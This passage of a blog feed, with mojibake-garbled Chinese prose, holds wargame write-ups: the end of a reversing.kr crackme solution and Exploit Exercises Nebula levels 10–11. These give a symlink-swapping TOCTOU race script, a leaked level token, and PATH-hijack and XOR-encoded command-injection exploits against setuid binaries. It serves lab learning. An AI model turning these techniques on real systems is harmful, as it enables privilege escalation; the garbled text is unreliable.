&lt;p&gt;è¿™æ˜¯ç¬¬äºŒä¸ªjmpï¼Œä¸¤ä¸ªå­—èŠ‚æœºå™¨ç ï¼Œç›®å‰è¿™ä¸ªjmpè¿”å›åå°±ä¼šæ‰§è¡Œè¿™ä¸ª&lt;code&gt;00401071&lt;/code&gt;çš„jmpï¼Œè€Œè¿™ä¸ªjmpæŠŠæˆ‘ä»¬åŸæ¥å¯ä»¥é¡ºåºæ‰§è¡Œåˆ°çš„Correctç»™ç»•å¼€äº†ï¼æ‰€ä»¥ï¼Œæˆ‘ä»¬è¦â€œåºŸæ‰â€è¿™ä¸ªjmpã€‚äºæ˜¯ä¹ï¼Œå›åˆ°EIPæ‰€åœ¨ä½ç½®ï¼Œä¹‹åæŠŠeaxæ”¹æˆ&lt;code&gt;00401071&lt;/code&gt;ï¼ˆç¬¬äºŒä¸ªjmpçš„åœ°å€ï¼‰ï¼Œæ‰§è¡Œåè·³å›&lt;code&gt;00401071&lt;/code&gt;ï¼Œè¿™ä¸ªæ—¶å€™ç¨‹åºå˜æˆäº†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00401071   &amp;gt; /90            nop
00401072   ? |90            nop
00401073   . |68 34 60 40 0&amp;gt;ascii &amp;quot;h4`@&amp;quot;,0                           ;  Correct!
00401078   . |68 E9030000   push 0x3E9                               ; |ControlID = 3E9 (1001.)
0040107D   . |56            push esi                                 ; |hWnd
0040107E   . |FF15 A0504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.SetDlgItemTe&amp;gt;; \SetDlgItemTextA
00401084   &amp;gt; |B8 01000000   mov eax,0x1
00401089   . |90            nop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¬¬äºŒä¸ªå¯æ¶çš„jmpè¢«æˆåŠŸå¹²æ‰ï¼Œå¹¶é¡ºåˆ©æ‰§è¡Œäº†Correctï¼&lt;/p&gt;
&lt;p&gt;åˆ°è¿™é‡Œå°±å¿«æˆåŠŸäº†ï¼ä¸‹é¢æˆ‘ä»¬éœ€è¦åšå¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œè®©ç¨‹åºè‡ªå·±ç®—å‡ºæ­£ç¡®çš„eaxå¹¶å®Œæˆæ•´ä¸ªé€»è¾‘ï¼Œæœ€ç»ˆå¼¹å‡ºæ­£ç¡®çš„æç¤ºã€‚&lt;/p&gt;
&lt;p&gt;å›è¿‡å¤´å®Œæ•´æ•´ç†ä¸€ä¸‹ç¨‹åºæµç¨‹ï¼šè·å–ç”¨æˆ·è¾“å…¥ --&amp;gt; å­˜å…¥ds:[0x4084D0]ï¼ˆå‘½åä¸ºaï¼‰ --&amp;gt; a=a+2 --&amp;gt; a=a+0x601605C7 --&amp;gt; a=a+2 --&amp;gt; aä½œä¸ºç›®æ ‡åœ°å€ï¼ˆ0x00401071ï¼‰æŠ¹å»2ä¸ªbyte --&amp;gt; Doneï¼æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç®—å‡ºaï¼Œa+4+0x601605C7=0x00401071ã€‚æ³¨æ„ï¼Œè¿™é‡Œçš„açš„é•¿åº¦æ˜¯dwordï¼Œä¹Ÿå°±æ˜¯unsigned intã€‚æ‰“å¼€calcï¼Œç®—å‡ºaä¸ºFFFFFFFFA02A0AA6ï¼Œæˆªå–å32bitå¾—åˆ°A02A0AA6ï¼Œè½¬åˆ°åè¿›åˆ¶ä¸º2687109798ã€‚é‡æ–°æ‰“å¼€ç¨‹åºï¼Œè¾“å…¥å¹¶è·å¾—Correctï¼&lt;/p&gt;
&lt;h1&gt;æ€»ç»“&lt;/h1&gt;
&lt;p&gt;è¿™é¢˜ä¸ªäººæ„Ÿè§‰è¿˜æ˜¯éå¸¸æœ‰æ„æ€çš„ï¼Œä¸å…‰ä¸€æ®µæœºå™¨ç åå¤åˆ©ç”¨ï¼Œè¿˜ç›´æ¥æŠŠæ•°æ®å½“ä»£ç è§£é‡Šï¼ˆå¯ç”¨äºåŠ¨æ€ç”Ÿæˆä»£ç æ‰§è¡Œï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç»†èŠ‚ï¼šä¸ºä½•ä»£ç ä¼šè¢«åå¤è°ƒç”¨ä¸¤æ¬¡ã€‚ç­”æ¡ˆå¾ˆç®€å•ï¼Œå› ä¸ºåˆ©ç”¨callå½“jmpä½¿ç”¨è¿˜æ˜¯å’Œç›´æ¥jmpæœ‰åŒºåˆ«çš„ï¼Œæ¯æ¬¡callä¼šä½¿å¾—è¿”å›åœ°å€å‹æ ˆï¼Œå› æ­¤æ‰§è¡Œåˆ°retnçš„æ—¶å€™ä¼šè·³åˆ°callä¹‹åçš„è¯­å¥å†æ‰§è¡Œä¸€éï¼ˆè¿™ä¸ªæŠ€å·§ä¸çŸ¥é“ä¼šä¸ä¼šç”¨äºç¼–è¯‘å™¨çš„ä¼˜åŒ–ï¼Œä½†æ˜¯å¾ˆå¯èƒ½ä¼šç”¨äºå¤–å£³çš„ç¼–å†™ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;å¦å¤–è¿™é“é¢˜èŠ±è´¹æ—¶é—´è¾ƒé•¿ï¼Œè¶…è¿‡å‰4ä¸ªEasyé¢˜æ‰€ç”¨çš„æ—¶é—´çš„æ€»å’Œã€‚è™½ç„¶æˆ‘å†™å‡ºæ¥çš„æ—¶å€™é€»è¾‘è¿˜ç®—æ˜¯æ¯”è¾ƒç®€å•å’Œæ¸…æ™°çš„ï¼Œä½†å®é™…éœ€è¦åå¤è°ƒè¯•å¾ˆå¤šæ¬¡æ¥ç†æ¸…æ€è·¯ã€‚æ‰€ä»¥ï¼Œé€†å‘çš„Debugæ˜¯ä¸ªè„‘åŠ›æ´»ï¼Œä¹Ÿæ˜¯ä½“åŠ›æ´»T^Tã€‚&lt;/p&gt;</summary><category term="reversing.kr"></category><category term="wargame"></category><category term="hacking"></category><category term="reversing"></category></entry><entry><title>Exploit Exercises Nebula level10-14 Writeup</title><link href="http://blog.yyx.name/posts/exploit-exercises-nebula-level-10-14.html" rel="alternate"></link><updated>2014-09-12T22:14:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-12:posts/exploit-exercises-nebula-level-10-14.html</id><summary type="html">&lt;h1&gt;Nebula level10&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;p&gt;å…·æœ‰SetUIDåŠŸèƒ½çš„äºŒè¿›åˆ¶æ–‡ä»¶flag10åœ¨æ»¡è¶³access()ç³»ç»Ÿè°ƒç”¨çš„æ¡ä»¶ä¸‹å¯ä»¥ä¸Šä¼ ä»»ä½•ç»™å®šæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &amp;lt; 3) {
    printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
    exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
    int fd;
    int ffd;
    int rc;
    struct sockaddr_in sin;
    char buffer[4096];

    printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);

    fd = socket(AF_INET, SOCK_STREAM, 0);

    memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(host);
    sin.sin_port = htons(18211);

    if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
      printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
      exit(EXIT_FAILURE);
    }

#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
      printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
      exit(EXIT_FAILURE);
    }
#undef HITHERE

    printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);

    ffd = open(file, O_RDONLY);
    if(ffd == -1) {
      printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
      exit(EXIT_FAILURE);
    }

    rc = read(ffd, buffer, sizeof(buffer));
    if(rc == -1) {
      printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
      exit(EXIT_FAILURE);
    }

    write(fd, buffer, rc);

    printf(&amp;quot;wrote file!\n&amp;quot;);

  } else {
    printf(&amp;quot;You don't have access to %s\n&amp;quot;, file);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;çœ‹åˆ°è¿™é•¿é•¿ä¸€æ®µCä»£ç â€¦â€¦çœ¼å‰å‡ºç°â€œè›‹ç–¼â€2å­—ï¼Œä¸è¿‡é¢˜è¿˜æ˜¯è¦åšçš„ï¼Œä¸æ‰“å°æ€ªå…½ï¼Œæ€ä¹ˆå½“å¥¥ç‰¹æ›¼ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç¨‹åºé€»è¾‘è¿˜æ˜¯å¾ˆç®€å•ï¼Œä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ–‡ä»¶è·¯å¾„ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸»æœºipã€‚ç¨‹åºé€šè¿‡accesséªŒè¯ç»™å®šè·¯å¾„çš„æ–‡ä»¶æ˜¯å¦æœ‰è¯»å–æƒé™ï¼Œå¦‚æœæœ‰åˆ™å¯¹æŒ‡å®šipä¸»æœºçš„18211ç«¯å£å‘é€ä¸€ä¸ªHITHEREçš„å­—ç¬¦ä¸²ï¼ˆè¯è¯´ä¸Šæ¬¡ç»™Githubçš„å¤§ç¥å†™é‚®ä»¶äººå®¶ä¹Ÿæ˜¯é‚£ä¹ˆæ‰“æ‹›å‘¼çš„â€¦â€¦ï¼‰ï¼Œå¦‚æœå‘é€æˆåŠŸï¼Œå°±è¯»å–æ–‡ä»¶å†…å®¹ä¹‹åå‘é€ã€‚&lt;/p&gt;
&lt;p&gt;flag10çš„homeç›®å½•ä¸‹æœ‰flag10ç¨‹åºå’Œtokenæ–‡ä»¶ï¼Œtokenå¯¹level10æ²¡æœ‰è¯»å–æƒé™ã€‚çœ‹æ¥åˆæ˜¯è¦ç»•å¼€æƒé™å»è¯»å–tokençš„å†…å®¹ã€‚ä½†æ˜¯åº”è¯¥å¦‚ä½•åšå‘¢ï¼Ÿåœ¨ç¿»çœ‹äº†&lt;a href="http://linux.die.net/man/2/access"&gt;access()&lt;/a&gt;çš„manæ‰‹å†Œåå‘ç°é‚£ä¹ˆä¸€å¥è¯ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.&lt;/p&gt;
&lt;p&gt;access()éªŒè¯æƒé™æ˜¯æœ‰é£é™©çš„ï¼Œå› ä¸ºåœ¨ä½ éªŒè¯æ–‡ä»¶å’ŒçœŸæ­£openæ–‡ä»¶çš„é—´éš™ï¼Œæ–‡ä»¶å¾ˆå¯èƒ½ä¼šè¢«åˆ©ç”¨ï¼&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è¿™ä¸ªWarningç»å¯¹æ˜¯ä¸ªå®Œç¾çš„Tipï¼Œé¡ºé¡ºæ€è·¯ï¼šå»ºç«‹ä¸€ä¸ªå‡çš„tokenæ–‡ä»¶ï¼ˆæœ‰æƒé™è¯»çš„ï¼‰ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªè½¯è¿æ¥æŒ‡å‘è¿™ä¸ªæ–‡ä»¶ã€‚é€šè¿‡éªŒè¯ååˆ©ç”¨çŸ­æš‚çš„é—´éš™ï¼ŒæŠŠè½¯è¿æ¥æŒ‡å‘çœŸæ­£çš„tokenï¼Œè¿™æ ·å°±ç‹¸çŒ«æ¢å¤ªå­äº†~&lt;/p&gt;
&lt;p&gt;æœ‰äº†æ€è·¯ï¼Œå¦‚ä½•å®ç°å‘¢ï¼Ÿncå¯ä»¥åˆ›å»ºç›‘å¬ï¼Œä½†æ˜¯æ²¡æ³•åœ¨ncçš„é€”ä¸­å¿«é€Ÿä¿®æ”¹è½¯è¿æ¥æŒ‡å‘ï¼ˆæ¯•ç«Ÿncæ˜¯ç‹¬å çš„ï¼Œæ— æ³•è¿”å›ï¼‰ã€‚äºæ˜¯æƒ³åˆ°äº†pythonã€‚&lt;code&gt;which python&lt;/code&gt;ä¸€ä¸‹ï¼Œæœç„¶è£…äº†pythonï¼Œå†&lt;code&gt;python -V&lt;/code&gt;ï¼Œå‘ç°pythonç‰ˆæœ¬2.7.2ã€‚ç›´æ¥vimå†™ä¸‹pythonä»£ç ï¼ˆserver.pyï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;#! /usr/bin/python
import os
from socket import *

HOST = ''
PORT = 18211
BUFSIZ = 4096
ADDR = (HOST, PORT)

tcpSerSock = socket(AF_INET, SOCK_STREAM)
tcpSerSock.bind(ADDR)
tcpSerSock.listen(5)

while True:
    print 'waiting for connection...'
    tcpCliSock, addr = tcpSerSock.accept()
    print 'connected!'

    while True:
        data = tcpCliSock.recv(BUFSIZ)
        if not data:
            break
        if data == '.oO Oo.\n':
            print 'get it baby!'
            os.system('ln -fs /home/flag10/token /home/level10/token')
    tcpCliSock.close()
tcpSerSock.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;é€€å‡ºåä½¿ç”¨&lt;code&gt;python server.py&lt;/code&gt;è®©è„šæœ¬è·‘èµ·æ¥ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºè½¯è¿æ¥ä½¿ç”¨äº†&lt;code&gt;-f&lt;/code&gt;å‚æ•°ï¼Œè¿™æ ·å¯ä»¥å¼ºåˆ¶è¦†ç›–å·²ç»å­˜åœ¨çš„åŒåè½¯è¿æ¥æ–‡ä»¶ã€‚ä¹‹å&lt;code&gt;Ctrl+Alt+F2&lt;/code&gt;åˆ‡æ¢åˆ°TTY2ï¼Œåœ¨level10å®¶ç›®å½•ä¸‹æ‰§è¡Œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;touch fake_token
ln -s fake_token token
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ ·æ–‡ä»¶å°±ä¼ªé€ å¥½äº†ï¼Œç„¶åæ‰§è¡Œflag10ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;/home/flag10/flag10 ~/token 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å®Œæ¯•å&lt;code&gt;Ctrl+Alt+F1&lt;/code&gt;åˆ‡å›TTY1çœ‹ç»“æœï¼Œ&lt;code&gt;615a2ce1-b2b5-4c76-8eed-8aa5c4015c27&lt;/code&gt;ï¼Œç”¨è¿™ä¸ªä½œä¸ºå¯†ç ç™»é™†flag10å¹¶getflagå³å¯ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œéœ€è¦ç•™æ„çš„æ˜¯ï¼Œå› ä¸ºCPUçš„æ‰§è¡Œæ–¹å¼æ˜¯æ—¶é—´ç‰‡ï¼Œå› æ­¤æ¯ä¸ªè¿›ç¨‹åªæœ‰åœ¨è‡ªå·±çš„CPUæ—¶é—´å†…æ‰èƒ½æ‰§è¡Œç›¸åº”çš„æŒ‡ä»¤ï¼Œä¹Ÿæ­£æ˜¯å› ä¸ºè¿™ä¸ªåŸå› ï¼ŒæŒ‡ä»¤çš„æ‰§è¡Œä¹‹é—´æ‰æœ‰äº†ç­‰å¾…ï¼Œå¹¶æœ‰äº†å…¶ä»–ç¨‹åºæ‰§è¡Œçš„å¯èƒ½æ€§ã€‚å¾ˆå¯èƒ½å½“CPUæ‰§è¡Œé€Ÿåº¦è¿‡å¿«çš„æ—¶å€™ï¼Œä½ çš„pyç¨‹åºè¿˜æ²¡æ¥å¾—åŠä¿®æ”¹è½¯è¿æ¥ï¼Œflag10å°±å·²ç»æ‰§è¡Œåˆ°æœ€åäº†ï¼Œå› æ­¤æ— æ³•è¯»å–åˆ°æ­£ç¡®çš„tokenã€‚è¿™æ—¶ä½ å¯ä»¥å¤šè¯•éªŒå‡ æ¬¡ï¼Œæˆ–è€…æƒ³åŠæ³•é™ä½flag10çš„ä¼˜å…ˆçº§ï¼ˆ&lt;code&gt;nice&lt;/code&gt;å¯ä»¥ä¿®æ”¹è¿›ç¨‹ä¼˜å…ˆçº§ï¼‰ï¼Œæé«˜pyè„šæœ¬çš„ä¼˜å…ˆçº§ï¼Œä»¥ç¡®ä¿pyè„šæœ¬å¯ä»¥æ›¿æ¢æ‰è½¯è¿æ¥ã€‚&lt;/p&gt;
&lt;h1&gt;Nebula level11&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The /home/flag11/flag11 binary processes standard input and executes a shell command.&lt;/p&gt;
&lt;p&gt;There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;
&lt;p&gt;flag11ä¼šå¤„ç†æ ‡å‡†è¾“å…¥ï¼ŒåŒæ—¶æ‰§è¡Œä¸€ä¸ªshellå‘½ä»¤ã€‚æœ¬å…³æœ‰ä¸¤ç§æ–¹æ³•ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv(&amp;quot;TEMP&amp;quot;);
  pid = getpid();

  asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid, 
    'A' + (random() % 26), '0' + (random() % 10), 
    'a' + (random() % 26), 'A' + (random() % 26),
    '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp;amp; 0xff;

  for(i = 0; i &amp;lt; length; i++) {
    buffer[i] ^= key;
    key -= buffer[i];
  }

  system(buffer);
}

#define CL &amp;quot;Content-Length: &amp;quot;

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
    errx(1, &amp;quot;reading from stdin&amp;quot;);
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
    errx(1, &amp;quot;invalid header&amp;quot;);
  }

  length = atoi(line + strlen(CL));

  if(length &amp;lt; sizeof(buf)) {
    if(fread(buf, length, 1, stdin) != length) {
      err(1, &amp;quot;fread length&amp;quot;);
    }
    process(buf, length);
  } else {
    int blue = length;
    int pink;

    fd = getrand(&amp;amp;path);

    while(blue &amp;gt; 0) {
      printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);

      pink = fread(buf, 1, sizeof(buf), stdin);
      printf(&amp;quot;pink = %d\n&amp;quot;, pink);

      if(pink &amp;lt;= 0) {
        err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
      }
      write(fd, buf, pink);

      blue -= pink;
    }  

    mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(mem == MAP_FAILED) {
      err(1, &amp;quot;mmap&amp;quot;);
    }
    process(mem, length);
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™é¢˜æ˜¯æ•´ä¸ªNebulaä¸­æœ€çº ç»“çš„ä¸€é¢˜ä¹‹ä¸€ï¼Œæœ€ä¸»è¦åŸå› æ˜¯å› ä¸ºä»£ç å’ŒäºŒè¿›åˆ¶ç¨‹åºä¸ç¬¦â€¦â€¦æˆ‘æŸ¥é˜…äº†Googleä¸­å‰å‡ é¡µåŸºæœ¬æ‰€æœ‰çš„Nebula level11çš„è§£é¢˜æ€è·¯ï¼Œå‘ç°èƒ½ä½œå‡ºç»“æœçš„ä»£ç éƒ½æ˜¯Nebulaçš„æ–°LiveCDä¹‹å‰çš„ã€‚æ‰€ä»¥è¿™é‡Œï¼Œæˆ‘ä»¬å…ˆå›åˆ°åŸæœ¬çš„ç¨‹åºã€‚å…ˆå°†ä¸Šé¢çš„ä»£ç ç”¨rootç¼–è¯‘ï¼Œå‘½åæˆflag11_oldï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶æƒé™ã€æ‰€æœ‰è€…ã€æ‰€æœ‰ç»„ç­‰å’Œflag11ä¸€è‡´ï¼Œç„¶åå¼€å§‹ä¸‹é¢çš„æ­¥éª¤ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ˜ å…¥çœ¼å¸˜çš„æ˜¯æ¯”å‰é¢ä¸€æ¬¡æ›´é•¿çš„ä»£ç -_-||| ä¸è¿‡å¥½åœ¨ä»£ç é€»è¾‘è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ã€‚è¿™é‡Œæ—¢ç„¶è¦æ‰§è¡Œshellï¼Œå°±ä¼šå®šä½åˆ°&lt;code&gt;system()&lt;/code&gt;ï¼Œè€Œè¿™æ ·å°±å¿…é¡»è¦è°ƒç”¨&lt;code&gt;process()&lt;/code&gt;ã€‚å¯ä»¥çœ‹åˆ°è°ƒç”¨å‘ç”Ÿåœ¨&lt;code&gt;main()&lt;/code&gt;çš„ç¬¬ä¸‰ä¸ªifä¸­ã€‚æ‰€è°“çš„ä¸¤ç§æ–¹æ³•å¯èƒ½æ˜¯æŒ‡èµ°ä¸åŒçš„é€»è¾‘å»æ‰§è¡Œ&lt;code&gt;process()&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è§‚å¯Ÿä¸€ä¸‹èµ°ifä¸ºtrueçš„è¿™æ¡çº¿ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;if(length &amp;lt; sizeof(buf)) {
    if(fread(buf, length, 1, stdin) != length) {
        err(1, &amp;quot;fread length&amp;quot;);
    }
    process(buf, length);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¬¬ä¸€ä¸ªæ¡ä»¶&lt;code&gt;length &amp;lt; sizeof(buf)&lt;/code&gt;å¾ˆç®€å•ï¼Œå¯æ˜¯ï¼Œ&lt;code&gt;fread()&lt;/code&gt;åªä¼šè¿”å›0æˆ–1ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦æ‰§è¡Œçš„æŒ‡ä»¤åªèƒ½æ˜¯1ä¸ªå­—èŠ‚çš„ã€‚ä½†å›è½¦ä¹Ÿä¼šå ç”¨1ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥åšä¸ªè¯•éªŒï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level11@nebula:/home/flag11$ ./flag11_old
Content-Length: 1

sh: $'\v\020\367': command not found
level11@nebula:/home/flag11$ ./flag11_old
Content-Length: 1

sh: $'\vP\241': command not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ ·å¯¹äºè·å–åˆ°äº†bufçš„å†…å®¹å®Œå…¨æ˜¯éšæœºçš„ã€‚å¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå•å­—ç¬¦å‘½ä»¤ï¼Œæ¯”å¦‚&lt;code&gt;X&lt;/code&gt;ï¼Œæ ¹æ®&lt;code&gt;process()&lt;/code&gt;ä¸­çš„ä»£ç ï¼Œå‘½ä»¤&lt;code&gt;X&lt;/code&gt;ä¼šå˜ä¸º&lt;code&gt;Y&lt;/code&gt;ï¼Œä¹‹åè¿›å…¥&lt;code&gt;system()&lt;/code&gt;æ‰§è¡Œã€‚æµ‹è¯•ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level11@nebula:/home/flag11$ ./flag11_old
Content-Length: 1
X
sh: $'Y\020\321': command not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°&lt;code&gt;X&lt;/code&gt;å‘½ä»¤è¢«å½“åš&lt;code&gt;Y&lt;/code&gt;å‘½ä»¤æ‰§è¡Œï¼Œä½†ç”±äºå·²ç»å ç”¨äº†ä¸€ä¸ªå­—ç¬¦ï¼Œåˆ™æ²¡æœ‰åŠæ³•è¾“å…¥å›è½¦ã€‚è¿™é‡Œå¯ä»¥ç”¨ä¸€ä¸ªæ‹¼è¿æ°”çš„åŠæ³•ï¼Œä¸æ–­æµ‹è¯•ï¼Œç›´åˆ°ç¢°åˆ°å†…å­˜ä¸­æœ‰0x0Aï¼ˆå›è½¦ï¼‰ä»è€Œè·å¾—è¿è¡Œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level11@nebula:/tmp$ ln -s /bin/getflag Y
level11@nebula:/tmp$ export PATH=/tmp:$PATH
level11@nebula:/tmp$ echo -ne &amp;quot;Content-Length: 1\nX&amp;quot; | /home/flag11/flag11_old
sh: $'Y\240S': command not found
level11@nebula:/tmp$ echo -ne &amp;quot;Content-Length: 1\nX&amp;quot; | /home/flag11/flag11_old
sh: $'Y\340d': command not found
level11@nebula:/tmp$ echo -ne &amp;quot;Content-Length: 1\nX&amp;quot; | /home/flag11/flag11_old
sh: $'Y\200b': command not found
level11@nebula:/tmp$ echo -ne &amp;quot;Content-Length: 1\nX&amp;quot; | /home/flag11/flag11_old
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿æ°”ä¸é”™ï¼Œæ²¡è¯•å‡ æ¬¡å°±å¾—åˆ°äº†ç»“æœ:D&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯èµ°ifçš„å¦å¤–ä¸€æ¡è·¯ï¼Œé‚£éœ€è¦æ»¡è¶³&lt;code&gt;length &amp;gt;= sizeof(buf)&lt;/code&gt;ï¼Œä¹Ÿå°±æ˜¯Length&amp;gt;=1024ã€‚å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ª1024é•¿åº¦çš„ç©ºå†…å®¹ï¼Œä¹‹åæŠŠéœ€è¦æ‰§è¡Œçš„å‘½ä»¤å¡«å……è¿›å»ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char* argv[]) {
    int length = 1024;
    char buffer[1024] = {0};
    unsigned int key;
    int i;

    memcpy(buffer, &amp;quot;/bin/getflag&amp;quot;, 13);

    key = length &amp;amp; 0xff;
    for(i = 0; i &amp;lt; length; i++) {
        buffer[i] ^= key;
        key -= buffer[i] ^ key;
    }

    puts(&amp;quot;Content-Length: 1024&amp;quot;);
    fwrite(buffer, 1, length, stdout);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ ¹æ®&lt;code&gt;getrand()&lt;/code&gt;ä¸­çš„è¦æ±‚ï¼Œè®¾ç½®ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;export TEMP=/tmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¼–è¯‘å¹¶æ‰§è¡Œç¨‹åºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;level11@nebula:~$ gcc -o exp11 exp11.c
level11@nebula:~$ ./exp11 | ~flag11/flag11_old
blue = 1024, length = 1024, pink = 1024
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ ·ä¸¤ç§æ–¹æ³•å°±å®ç°äº†ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åè¯´ä¸€è¯´ä¸ºä»€ä¹ˆæ–°çš„æ–‡ä»¶ä¸èƒ½æˆåŠŸè¿è¡Œç¨‹åºã€‚åæ±‡ç¼–ä¸€ä¸‹flag11ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;   0x080489c7 &amp;lt;+0&amp;gt;:     push   %ebp
   0x080489c8 &amp;lt;+1&amp;gt;:     mov    %esp,%ebp
   0x080489ca &amp;lt;+3&amp;gt;:     sub    $0x28,%esp
   0x080489cd &amp;lt;+6&amp;gt;:     mov    0xc(%ebp),%eax
   0x080489d0 &amp;lt;+9&amp;gt;:     and    $0xff,%eax
   0x080489d5 &amp;lt;+14&amp;gt;:    mov    %eax,-0x10(%ebp)
   0x080489d8 &amp;lt;+17&amp;gt;:    movl   $0x0,-0xc(%ebp)
   0x080489df &amp;lt;+24&amp;gt;:    jmp    0x8048a0c &amp;lt;process+69&amp;gt;
   0x080489e1 &amp;lt;+26&amp;gt;:    mov    -0xc(%ebp),%eax
